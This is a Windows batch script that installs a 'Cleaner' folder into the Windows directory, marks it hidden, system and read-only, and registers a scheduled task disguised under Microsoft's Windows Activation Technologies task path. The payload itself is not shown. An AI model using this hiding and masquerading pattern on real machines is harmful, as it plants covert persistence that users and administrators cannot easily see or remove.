@echo off
mode con cols=28 lines=3
pushd %~dp0

echo.
echo.  Working, Please wait ...
ping 127.0.0.1 -n 2 >nul
if exist %Windir%\Cleaner attrib %Windir%\Cleaner /d -h -s -r
mode con cols=28 lines=11
echo.
echo.  Copying Cleaner file ...
1>nul 2>nul xcopy Cleaner "%Windir%\Cleaner" /cheriky && echo       status: OK
IF ERRORLEVEL 1 echo       status: Error
ping 127.0.0.1 -n 2 >nul
echo.
echo.  Hidden Cleaner file ...
1>nul 2>nul attrib %Windir%\Cleaner /d +h +s +r && echo       status: OK
IF ERRORLEVEL 1 echo       status: Error
ping 127.0.0.1 -n 2 >nul
echo.
echo. Installing Cleaner Task ...
1>nul 2>nul schtasks /create /tn "\Microsoft\Windows\Windows Activation Technologies\Cleaner" /xml Cleaner.xml /f && echo       status: OK
IF ERRORLEVEL 1 echo       status: Error
ping 127.0.0.1 -n 2 >nul
cls
mode con cols=28 lines=3
echo.
echo.     Done, Successfully.
ping 127.0.0.1 -n 2 >nul
exit

















